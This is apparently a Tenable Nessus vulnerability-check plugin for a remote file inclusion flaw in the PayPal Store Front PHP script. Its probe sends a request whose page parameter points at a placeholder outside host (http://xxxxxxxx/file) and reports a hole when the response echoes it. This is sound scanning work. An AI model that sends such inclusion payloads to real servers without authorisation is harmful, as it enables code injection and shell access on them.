#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(11873);
 script_version ("$Revision: 1.11 $");
 script_bugtraq_id(8791);
 script_xref(name:"OSVDB", value:"2652");

 script_name(english:"PayPal Store Front index.php page Parameter Remote File Inclusion");

 script_set_attribute(attribute:"synopsis", value:
"The remote host contains a PHP script that is affected by a
remote file include vulnerability." );
 script_set_attribute(attribute:"description", value:
"It is possible to make the remote host include php files 
hosted on a third party server using the PayPal Store Front 
CGI suite which is installed. An attacker may use this flaw 
to inject arbitrary code in the remote host and gain a shell
with the privileges of the web server." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to the latest version." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );

script_end_attributes();
 
 script_summary(english:"Checks for the presence of index.php");
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

if(!can_host_php(port:port))exit(0);

function check(loc)
{
 local_var r, req;
 
 r = http_send_recv3(port:port, method:"GET", item:string(loc,"/index.php?do=ext&page=http://xxxxxxxx/file"));

 if( isnull(r))exit(1, "Null response to index.php.");
 if(egrep(pattern:".*http://xxxxxxxx/file\.php", string:r[2]))
 {
 	security_hole(port);
	exit(0);
 }
}

foreach dir (cgi_dirs())
{
 check(loc:dir);
}
